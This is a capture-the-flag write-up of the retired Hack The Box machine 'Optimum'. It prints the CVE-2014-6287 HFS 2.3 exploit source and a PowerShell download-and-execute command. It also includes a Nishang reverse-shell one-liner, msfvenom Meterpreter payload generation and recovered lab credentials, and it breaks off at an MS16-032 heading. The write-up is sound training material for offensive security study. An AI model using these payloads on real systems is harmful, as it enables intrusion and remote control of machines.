---
title: "Hack The Box: Optimum"
date: 2026-08-30
ref: WU-006
summary: "Rooting the retired HTB 'Optimum' machine — exploiting a remote code execution vulnerability in HttpFileServer 2.3 to gain an initial foothold as a low-privileged user, then escalating to SYSTEM via a Windows kernel privilege escalation exploit."
tags: [hack-the-box, hfs, http-file-server, windows, rce, cve-2014-6287, privilege-escalation, ms16-032, sherlock, watson]
---

<h1 align="center">Optimum — Hack The Box Write-up</h1>

<p align="center">
  <img src="{{ '/assets/img/htb-optimum/Optimum_Logo.png' | relative_url }}" width="300"/>
</p>

**Description:** Optimum is an easy-rated Windows machine on Hack The Box focused on exploiting a vulnerable file server and Windows kernel privilege escalation. The attack path involves exploiting a remote code execution vulnerability in HttpFileServer 2.3 to gain initial access as a low-privileged user, followed by escalating to SYSTEM using a local privilege escalation exploit against a partially patched but outdated Windows Server 2012 R2 Standard build.


**Retired machine — `optimum.htb`**

- **IP Address:** 10.129.54.27
- **Operating System:** Windows Server 2012 R2 Standard
- **Architecture:** x64

**Credentials:** 
Kotas's users credentials discovered in WinPeas output.
```
Kotas:kdeEjDowkS*
```

**Nmap**
```NMAP 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-27 13:19 EDT
Nmap scan report for 10.129.54.27
Host is up (0.023s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.67 seconds
```

**Quick Services:**

|Port|Service|
|---|---|
|80|HTTP (HttpFileServer httpd 2.3)|

**Completion Status:**

- Root Flag: [Yes]
- User Flag: [Yes]
- Completion: [Complete] (100%)

---
### Enumeration

We begin the machine using our Scripts and Services scan and find just one port open. This makes things quite straightforward for us, as we only need to investigate one active service at this time. From the version information returned, we can see that port 80 is running `HttpFileServer httpd 2.3`, which gives us the answer to 'Guided Mode' task one's question.

```bash
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Optimum]
└─$ nmap -sCV -oA Scans/Nmap-Service+Version 10.129.54.27  

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

As we have no other ports to work with, this looks like it could be our entry point. If we find nothing useful here, we'll need to come back and sweep all 65,535 ports and potentially look at UDP as well. For now, let's keep things simple and scope out what's being offered on port 80.

---
### HTTP (Port 80) — HttpFileServer 2.3

Given the lack of alternatives at this point, it makes absolute sense to investigate port 80. Navigating to the webpage, we find an HTTP File Server application that we'll need to investigate further. Checking the version becomes particularly important later, as this information will help us identify a potential route to gaining a foothold on the system.

We can start by opening a browser of our choice (Firefox in this case, as it's Kali's default) and navigating to `http://10.129.54.27/`. When the web application loads, we get some useful information right away. We can see that it's running `HttpFileServer 2.3`, giving us an exact version to work with when searching for vulnerabilities.
![HTTP HFS2.3]({{ '/assets/img/htb-optimum/Optimum_HTTP_HFS2.3.png' | relative_url }})

After clicking around a little and attempting some common password guesses, we can check whether there are any default credentials associated with the service. A quick search on Google gives us a strong indication that there are no default credentials available, so there's little more to gain from this approach and we should move on.

Working with what we have, we now know the exact version of the web application, so let's use `searchsploit` and search for the exact string provided in the server information. Our search for `HttpFileServer 2.3` proves fruitful, as we find a matching exploit for an unauthenticated Remote Code Execution (RCE) vulnerability.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Optimum]
└─$ searchsploit HttpFileServer 2.3         
-----------------------------------------------------------------------------------
 Exploit Title                                          |  Path
-----------------------------------------------------------------------------------
Rejetto HttpFileServer 2.3.x - RCE (3)                  | windows/webapps/49125.py
-----------------------------------------------------------------------------------
Shellcodes: No Results
```

If this works, we should be able to obtain a session on the target. However, it would be foolish to simply fire the exploit off without first understanding how and why it works. In the next section, we'll break down the attack vector, make any revisions required to the script if it's required, and then attempt to use the exploit we've discovered.

---
### Remote Code Execution (CVE-2014-6287)

Attempting to understand the exploit gives us a good learning opportunity here. By breaking down the inner workings of the discovered Python script, we can understand what it's doing before modifying the command arguments to tailor it to our requirements.

We can use `searchsploit -x windows/webapps/49125.py` to inspect the script's contents before copying or using it. The results show us a Python 3 script, meaning we won't need to do any porting, and the exploit is immediately usable in its current state. We can also find the answer to Guided Mode Task Two's question within the comments, which identify the CVE designation associated with the exploit.
```Python
# Exploit Title: Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)
# Google Dork: intext:"httpfileserver 2.3"
# Date: 28-11-2020  
# Remote: Yes
# Exploit Author: <C3><93>scar Andreu
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287 <-- Task 2

#!/usr/bin/python3

# Usage :  python3 Exploit.py <RHOST> <Target RPORT> <Command>
# Example: python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4/shells/mini-reverse.ps1')"

import urllib3
import sys
import urllib.parse

try:
        http = urllib3.PoolManager()
        url = f'http://{sys.argv[1]}:{sys.argv[2]}/?search=%00{{.+exec|{urllib.parse.quote(sys.argv[3])}.}}'
        print(url)
        response = http.request('GET', url)

except Exception as ex:
        print("Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command")
        print(ex)
```

Inspecting the script gives us a few clues about how it works, what arguments it expects, and how we might chain its functionality together to gain a shell on the system. To reinforce our understanding, we can first read through the code and try to understand what it's doing (see the full explanation below for those who want a more detailed breakdown). From there, we can manually test the vulnerability before firing the final reverse shell payload.

> **How `49125.py` works?**
> The script targets CVE-2014-6287, a pre-authenticated remote code execution vulnerability in Rejetto HTTP File Server 2.3.x. Three arguments are passed at runtime — RHOST, RPORT, and the command to execute — keeping it lean and reusable across different targets without touching the source. `urllib3.PoolManager` handles the HTTP transport, and `urllib.parse.quote` URL-encodes the command before it's embedded in the request so special characters don't break the payload in transit.
> 
> The actual exploitation happens in the URL construction. HFS ships with a built-in macro language used for internal templating, and the search parameter gets passed directly into that engine without sanitisation. The `{.+exec|<command>.}` syntax is a legitimate HFS macro that executes a system command — abusing it here is less a traditional exploit and more just using a built-in feature against the application. The problem is HFS does attempt to filter macro syntax from user input, checking for `{` at the start of the string. The `%00` null byte prepended to the payload is what defeats that — the string comparison terminates at the null byte before it ever reaches the `{`, so the filter considers the input clean and passes it straight to the template engine.
> 
> The result is arbitrary command execution in the context of whichever user HFS is running as — no authentication, no memory corruption, no shellcode. The application's own scripting engine does the work. One thing worth noting is that this is exactly the kind of vulnerability that comes from bolting a scripting layer onto a web-facing application without treating user input as untrusted — the macro engine was never designed to be exposed to unauthenticated input, and the null byte filter was clearly an afterthought that didn't account for how C-style string handling terminates on null bytes.

Now that we have an understanding of the vulnerability and how the script works, we can reinforce that knowledge by manually testing the exploit. This gives us a chance to demonstrate that we understand what the script is doing, rather than simply letting it do all the heavy lifting for us.

Let's edit the script's `url` string to trigger an innocuous payload. This will allow us to validate that the exploit works and test the connection between the Optimum box and our Kali machine. It's a useful precursor test before attempting to send any kind of shell payload.

Looking at the URL string, there are a few concepts we need to understand before we can edit it for use in the browser's address bar:

1. We see `{sys.argv[x]}` within the string, where `x` represents the argument being inserted into the constructed URL based on the values supplied to the script (`RHOST`, `RPORT`, and the command). If we're going to test this manually, we'll need to replace these with the corresponding values we would otherwise provide to the script.
2. Because we're using [CyberChef](https://gchq.github.io/CyberChef), we need to be careful with the null byte `%00`. When URL decoded, this represents a NUL byte rather than the literal word `null`. We need to keep the `%00` intact when constructing our payload, otherwise the exploit won't work correctly.
3. We'll use the script's example to call `c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe` and then run a quick ping to test the functionality. We could simply call `cmd`, but using PowerShell gives us an opportunity to test whether we can execute commands through PowerShell. This will become useful later on.
4. The double curly braces `{{` and `}}` in the f-string are Python's way of escaping literal `{` and `}` characters. When the URL is actually constructed, these become single braces, so we'll need to account for this when manually recreating the payload.
![RCE DecodeURL]({{ '/assets/img/htb-optimum/Optimum_RCE_DecodeURL.png' | relative_url }})

We can now edit the string to include the variables and corrections discussed above.

- First, we enter Optimum's IP address, `10.129.54.27`, replacing `{sys.argv[1]}`.
- Next, we replace `{sys.argv[2]}` with the port `80`. This isn't strictly necessary in this instance because HTTP is running on its default port, but it helps demonstrate how the argument is being passed to the script and reinforces our understanding of how it works.
- Next, we'll use `c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe ping -n 3 10.10.14.62` as our command argument.
- Finally, we can strip out the double curly braces `{{` and `}}` used by Python's f-string to escape literal braces. These aren't required in our manually constructed URL and would otherwise cause the request to fail.

The result will look something like the example below. We've now constructed the URL, but it's not quite ready to send yet.

```HTTP
http://10.129.54.27:80/?search=%00{. exec|c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe ping -n 3 10.10.14.62.}
```

Before we copy and paste the string into Firefox's address bar, we should URL-encode the payload. This ensures that the special characters required by the exploit are correctly represented during transmission and aren't interpreted or altered by the browser or web server. Encoding the payload also helps preserve its integrity and is generally good practice when working with specially constructed URLs.

> **Why URL encode payloads?**
> HTTP has a defined set of reserved characters — spaces, `&`, `/`, `+`, `=` and others — that carry structural meaning in a request. Embedding them raw inside a parameter value breaks the request: a space becomes a delimiter, an `&` splits the parameter string, and a `/` is interpreted as a path separator.
> 
> URL encoding ([RFC 3986](https://datatracker.ietf.org/doc/html/rfc3986)) replaces those characters with a percent sign followed by their two-digit hex value — a space becomes `%20`, a backslash `%5C` — so the payload travels intact without being misread as request structure by the server or any intermediary.
> 
> It is best practice to URL encode any payload before embedding it in a request, even when characters _appear_ safe — proxies, WAFs, and application parsers all handle raw special characters inconsistently. Encoding ensures the payload arrives exactly as constructed.

In our case, we can use CyberChef's URL Encode operation. Comparing the input and output helps us understand exactly what has been changed and reinforces what we've learned so far about how special characters are represented within the URL.
![RCE EncodeURL]({{ '/assets/img/htb-optimum/Optimum_RCE_EncodeURL.png' | relative_url }})

For the final step, we'll use `sudo tcpdump -i tun0 icmp` to capture any incoming ICMP traffic. Once the capture is running, we can send the encoded URL request using the browser's address bar and watch for the results.

We see a successful response, with several ICMP requests arriving at our Kali machine. We appear to receive slightly more than the three pings we requested, but this doesn't affect the purpose of the test. The important thing is that we're receiving ICMP traffic from Optimum, confirming that our manually constructed payload is being delivered and executed successfully. This also demonstrates that we have reliable bidirectional connectivity between the two hosts, with no obvious filtering or connectivity issues that should prevent us from establishing a reverse shell later.
![RCE ICMP]({{ '/assets/img/htb-optimum/Optimum_RCE_ICMP.png' | relative_url }})

Now that everything is working as expected and we've covered the relevant theory and testing, we can put our knowledge into practice. In the next section, we'll turn our successful exploit into an actual foothold on the system.

---
### Shell as Kostas (Initial Access)

With our payload delivery working, we can now turn the Rejetto HttpFileServer 2.3.x RCE exploit into actual access to the system. Before doing so, we'll grab the Nishang framework and its collection of PowerShell scripts. We can then use one of these scripts in combination with the `49125.py` exploit to deliver our reverse shell and establish a foothold on the target.

> **Warning — Legacy tools**
> Optimum is a nine-year-old box, and that age is the point. Vintage machines are a window into techniques that were cutting-edge at the time — and Nishang is a good example of why that still matters. It was once a default Kali tool, a go-to offensive PowerShell framework, and has since been deprecated and stripped from the standard repository. Stock Nishang scripts are effectively dead against modern targets — AMSI and aggressive vendor signature coverage catch the default payloads instantly — but against a box from this era they run clean, which is exactly why this chain works.
> 
> The approach here is straightforward: a Nishang PowerShell TCP reverse shell, pulled into memory and chained directly with CVE-2014-6287. No disk writes, no AV evasion required — the target simply predates the defences that would block it.
> 
> The reason this is worth understanding beyond just getting a shell: the underlying logic hasn't changed. Modern threat actors still use Nishang as a baseline, stripping the signatures through obfuscation rather than reinventing the technique. For blue teams especially, understanding the original mechanics is what makes the obfuscated variants recognisable — the behavioural fingerprint survives even when the code doesn't.

We clone the Nishang repository directly into the `/opt` directory. In Linux filesystem conventions, `/opt` stands for "optional" and is commonly used for housing third-party, manually compiled, or cloned software packages. Storing the framework here keeps our user home directory clean, centralises our offensive toolkit, and gives us a consistent location from which to access the scripts whenever we need them.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Optimum]
└─$ cd /opt

┌──(kali㉿kali)-[/opt]
└─$ sudo git clone https://github.com/samratashok/nishang.git
Cloning into 'nishang'...
remote: Enumerating objects: 1705, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 1705 (delta 3), reused 0 (delta 0), pack-reused 1699 (from 3)
Receiving objects: 100% (1705/1705), 10.89 MiB | 19.09 MiB/s, done.
Resolving deltas: 100% (1064/1064), done.

```

Now let's move our tools into a single location where we can easily access them, while also renaming the files to simpler names for ease of use. First, we'll use `searchsploit -m` to mirror the CVE-2014-6287 exploit into our working directory, then rename it to `exploit.py`.

Next, we can copy the `Invoke-PowerShellTcpOneLine.ps1` script using `cp` and rename it to `rev.ps1`. With both files in the same location and using simpler names, we now have everything we need to continue.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Optimum/Exploit]
└─$ searchsploit -m windows/webapps/49125.py                
  Exploit: Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)
      URL: https://www.exploit-db.com/exploits/49125
     Path: /usr/share/exploitdb/exploits/windows/webapps/49125.py
    Codes: CVE-2014-6287
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/kali/Documents/Hack The Box/Machines/Optimum/Exploit/49125.py

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Optimum/Exploit]
└─$ mv 49125.py exploit.py 

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Optimum/Exploit]
└─$ cp /opt/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 rev.ps1 
```

Next, we'll need to edit `rev.ps1` so that it contains the IP address and port of our Kali machine that the reverse connection will be made to. As the script is a single line, we'll use a GUI-based editor to make these changes.

Once we've made the required modifications, we can start a Python HTTP server from our working directory. This will allow the Optimum machine to retrieve the PowerShell script when we trigger the exploit.
```Powershell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Optimum/Exploit]
└─$ cat rev.ps1                       

$client = New-Object System.Net.Sockets.TCPClient('10.10.14.62',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

$sm=(New-Object Net.Sockets.TCPClient('10.10.14.62',443)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Optimum/Exploit]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

Everything is now ready and we can send the payload. We'll use `exploit.py` to achieve RCE, then use PowerShell with an `IEX` expression to create a WebClient instance that downloads and executes `rev.ps1`. This is our Nishang `Invoke-PowerShellTcpOneLine` reverse shell script.

Once the process completes, we land a session on the machine as the 'kostas' user. We now have an actual foothold on the system, and this also gives us the answer to 'Guided Mode' task three's question.
``` Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Optimum/Exploit]
└─$ python3 exploit.py 10.129.54.27 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.62/rev.ps1')"
http://10.129.54.27:80/?search=%00{.+exec|c%3A%5Cwindows%5CSysNative%5CWindowsPowershell%5Cv1.0%5Cpowershell.exe%20IEX%20%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//10.10.14.62/rev.ps1%27%29.}

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Optimum/Exploit]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.54.27 - - [28/Aug/2026 00:48:54] "GET /rev.ps1 HTTP/1.1" 200 -
10.129.54.27 - - [28/Aug/2026 00:48:54] "GET /rev.ps1 HTTP/1.1" 200 -
10.129.54.27 - - [28/Aug/2026 00:48:54] "GET /rev.ps1 HTTP/1.1" 200 -
10.129.54.27 - - [28/Aug/2026 00:48:54] "GET /rev.ps1 HTTP/1.1" 200 -

┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Optimum]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.62] from (UNKNOWN) [10.129.54.27] 49225

PS C:\Users\kostas\Desktop> whoami
optimum\kostas <-- Task 3
```

#### Obtaining the User Flag

As we've now landed on the system, we might as well grab the user flag while we're here. We can use the `dir` command to list the files located on Kostas' desktop. Sure enough, we find the first flag, which we can inspect using the `type` command.

```PowerShell
PS C:\Users\kostas\Desktop> dir


    Directory: C:\Users\kostas\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         18/3/2017   2:11 ??     760320 hfs.exe                           
-ar--          3/9/2026   5:08 ??         34 user.txt                          


PS C:\Users\kostas\Desktop> type user.txt
[user flag redacted]
```

In this case, we can also see `hfs.exe`, which is the application being run by the `Kostas` user. This helps explain why our shell has landed in a standard user context rather than an IIS service account. I suspect this was a deliberate choice by the creator, as landing directly as `IIS APPPOOL\DefaultAppPool` on Windows Server 2012 R2 could have made the next stage considerably easier for an attacker looking to gain full administrative access.

As an IIS service account, a shell running in this context would typically inherit **`SeImpersonatePrivilege`**, which can provide a relatively straightforward route towards privilege escalation. On Build 9600, which we'll identify in the next section, this privilege can potentially be abused using tools such as **Juicy Potato**. Instead, we're currently sitting in the `Kostas` user context, meaning we'll need to do some more digging to find our route towards `SYSTEM`.

---
### Privilege Escalation

Our first priority before running any additional scripts should be to understand the system and its architecture. Only once we have a better picture of what we're working with should we start running enumeration scripts or looking for potential privilege escalation exploits.

Ahead, we'll first address the issue of unstable shell execution caused by the way our current session handles processes. From there, we'll approach privilege escalation from two different angles, demonstrating both automated and manual methods for identifying exploits that may be suitable for the system.

To start, we can run the `systeminfo` command. This will not only confirm the operating system version and build number, but also show us that the system is x64-based. This is an important piece of information that will become useful several times throughout the privilege escalation process.
```PowerShell
PS C:\Users\kostas\Desktop> systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ??
System Boot Time:          3/9/2026, 5:07:34 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 504 MB
Virtual Memory: Max Size:  6.570 MB
Virtual Memory: Available: 1.429 MB
Virtual Memory: In Use:    5.141 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.10.2
                                 IP address(es)
                                 [01]: 10.129.54.27
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

#### Automated Enumeration and Exploitation

We could spend a long time fumbling around the system, running the odd command here and there and trying to piece together what's useful, or we can start with some automated analysis to improve the speed and efficiency of what can otherwise be a somewhat overwhelming task. The first tool that comes to mind is **WinPEAS (Windows Privilege Escalation Awesome Script)**, which can collect a large amount of useful information in a single sweep and give us a much better starting point for identifying potential privilege escalation routes.

```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Optimum/Exploit]
└─$ locate winpeas
/usr/bin/winpeas
/usr/share/applications/kali-winpeas.desktop
/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/kali-winpeas.svg
<----------------------------------SNIP------------------------------------------->
/usr/share/peass/winpeas/winPEASany_ofs.exe
/usr/share/peass/winpeas/winPEASx64.exe <-- We need this one
/usr/share/peass/winpeas/winPEASx64_ofs.exe
/usr/share/peass/winpeas/winPEASx86.exe
/usr/share/peass/winpeas/winPEASx86_ofs.exe

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Optimum/Exploit]
└─$ cp /usr/share/peass/winpeas/winPEASx64.exe pea.exe
```

We change directory to `Documents`, purely because writing files here would be less suspicious if this were a real user environment. From there, we use the shorthand `Invoke-WebRequest` (`IWR`) command to download the x64 version of WinPEAS onto the system.

We then attempt to run the executable from our current shell environment, but the session hangs almost immediately. This effectively leaves our shell unusable and means we'll need to investigate why the session is behaving this way before we can continue with our enumeration.
```PowerShell
PS C:\Users\kostas\Desktop> cd ../Documents

PS C:\Users\kostas\Documents> iwr -uri http://10.10.14.62/pea.exe -Outfile pea.exe

PS C:\Users\kostas\Documents> dir

    Directory: C:\Users\kostas\Documents

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----
-a---          3/9/2026   6:46 ??   10170880 pea.exe                                                    
PS C:\Users\kostas\Documents> ./pea.exe
```

We'll need to reset the shell and figure out a way around this behaviour if we want the script to run correctly. We can use `Ctrl + C` to terminate the current session, allowing us to start the process again and try a different approach.

This gives us another very important lesson that we've seen in previous walkthroughs: **not all shells are built the same!**

> **Note — Shell Limitations and Restrictions**
> Working with shells long enough makes one thing clear — they are not interchangeable. The Nishang TCP reverse shell is a non-PTY shell: it pipes stdin and stdout directly over a TCP socket without a proper terminal layer underneath. That matters because interactive or blocking child processes expect a PTY to attach to, and when they don't find one the shell hangs, misbehaves, or dies. Crashing a shell that may have limited re-trigger opportunities is a painful lesson, so the better habit is to establish a second connection early and treat the original as a transport layer only — file drops, session spawning, nothing that risks killing it. If anything goes wrong in the working session, there is always a fallback without having to re-exploit. Worth noting this is a CTF and lab consideration specifically; maintaining multiple outbound connections is not advisable when attempting to stay under the radar on a real engagement.
> 
> One additional thing worth flagging for tmux users: tmux enforces a scrollback buffer limit, defaulting to 2,000 lines in older versions. Any output beyond that is gone — lengthy script output, enumeration results, anything that runs long simply gets cut off and cannot be recovered from the terminal. Three ways around it: write output directly to file, increase the history limit with `set-option -g history-limit <n>` in `.tmux.conf`, or spawn the session outside of tmux entirely. The last option tends to be the most reliable since it sidesteps the buffer entirely rather than just raising the ceiling. Either way, knowing about this before losing important output is considerably less frustrating than finding out during a timed assessment.

Given that we're working towards an automated approach and need to sidestep the limitations of our current shell, we can generate a Meterpreter reverse shell executable and transfer it to the target. We can then start Metasploit's `multi/handler` module, which will listen for the incoming connection and catch the Meterpreter session once the binary has been transferred and executed.
``` Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Optimum/Exploit]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.62 LPORT=443 -f exe -o met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: met.exe

┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Optimum]
└─$ sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.62; set lport 443; exploit"
[sudo] password for kali: 
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
lhost => 10.10.14.62
lport => 443
[*] Started reverse TCP handler on 10.10.14.62:443 
```

We reopen our initial session using the CVE-2014-6287 exploit, giving us a way back onto the system. From there, we can transfer our newly generated Meterpreter payload onto the machine. Once the binary has been transferred, we execute it and receive a reverse connection back to our listener, giving us a more capable session to work with.
``` PowerShell
PS C:\Users\kostas\Documents> iwr -uri http://10.10.14.62/met.exe -Outfile met.exe

PS C:\Users\kostas\Documents> ./met.exe
```

Our listener establishes the connection and opens a new Meterpreter session labelled as `1`. As we're currently working from a Meterpreter session, we can drop into a standard Windows shell using the `shell` command. From here, we can see that we've landed in `C:\Users\kostas\Documents`. Running `dir` shows that we have access to `pea.exe`, so we can now attempt to run the executable again from our new shell session.
```Shell
[*] Sending stage (230982 bytes) to 10.129.54.27
[*] Meterpreter session 1 opened (10.10.14.62:443 -> 10.129.54.27:49170) at 2026-08-28 02:14:52 -0400

meterpreter > shell
Process 1452 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is EE82-226D

 Directory of C:\Users\kostas\Documents

03/09/2026  06:13 ��    <DIR>          .
03/09/2026  06:13 ��    <DIR>          ..
03/09/2026  06:10 ��             7.680 met.exe
03/09/2026  06:13 ��        10.170.880 pea.exe
               2 File(s)     10.178.560 bytes
               2 Dir(s)   5.658.341.376 bytes free

C:\Users\kostas\Documents>pea.exe
```

This time, we have no issues at all and get a large amount of information to sift through. Unfortunately, we don't find anything immediately useful in terms of privilege escalation. We do, however, find the answer to Guided Mode Task Five's question in the form of some auto-logon credentials for the 'kostas' user.
```Shell
����������͹ AV Information
  [X] Exception: Invalid namespace 
    No AV was detected!! <-- Reason why Nishang works
    Not Found

����������͹ Users
� Check if you have some admin equivalent privileges https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users--groups

  Current user: kostas
  Current groups: Domain Users, Everyone, Users, Interactive, Console Logon, Authenticated Users, This Organization, Local account, Local, NTLM Authentication
   ===================================================================================

    OPTIMUM\Administrator: Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-Expi-Req

    OPTIMUM\Guest(Disabled): Built-in account for guest access to the computer/domain
        |->Groups: Guests
        |->Password: NotChange-NotExpi-NotReq

    OPTIMUM\kostas
        |->Groups: Users
        |->Password: CanChange-NotExpi-Req

����������͹ Current Token privileges <-- No tokens unlike IIS service user
� Check if you can escalate privilege using some enabled token https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation

    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED

����������͹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  kostas
    DefaultPassword               :  kdeEjDowkS* <-- Task 5

```

One thing we can do is check for known vulnerabilities that may allow us to escalate our privileges. Metasploit has a module specifically designed for this task, which is one of the benefits of using an automated framework. A quick search for `Suggester` gives us two options: one for suggesting potential exploits on a system, and another for identifying methods of establishing persistence. Given our current needs, the former is what we're looking for, so we select `post/multi/recon/local_exploit_suggester`. This also gives us the answer to 'Guided Mode' task six's question.
![PrivEsc Suggester]({{ '/assets/img/htb-optimum/Optimum_PrivEsc_Suggester.png' | relative_url }})

Selecting the module and running `show options`, we can see that we only need to configure one parameter. In this instance, we set `SESSION` to `1`, telling Metasploit to run the module against our active Meterpreter session.
```Shell
msf exploit(multi/handler) > use 0
msf post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.

msf post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf post(multi/recon/local_exploit_suggester) > run
```

Looking at the results, we get around ten potentially vulnerable modules that may work against the system. For our purposes, we'll select two: **MS16-032** and **CVE-2019-1458**. The reasoning behind these choices will be discussed in the _Beyond Root_ section, where we'll explore both vulnerabilities in a little more depth.
![PrivEsc ExploitSuggestion]({{ '/assets/img/htb-optimum/Optimum_PrivEsc_ExploitSuggestion.png' | relative_url }})


**MS16-032**

